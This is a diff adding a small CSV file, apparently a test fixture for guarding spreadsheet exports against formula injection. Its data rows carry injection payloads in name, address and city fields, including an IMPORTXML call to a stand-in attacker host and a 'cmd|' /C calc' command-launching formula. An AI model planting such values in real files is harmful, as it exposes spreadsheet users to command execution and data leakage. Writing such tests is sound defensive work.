@@ -1,0 +1,4 @@
+ID,First Name,Last Name,Address,City,Telephone
+1,'=SUM(A1:A10),Test,Normal Address,Boston,5551234567
+2,'-2+3+cmd,Smith,'@IMPORTXML('https://evil.example.com'),Springfield,5559998888
+3,Normal,Franklin,123 Main St.,'+cmd|' /C calc,6085551023
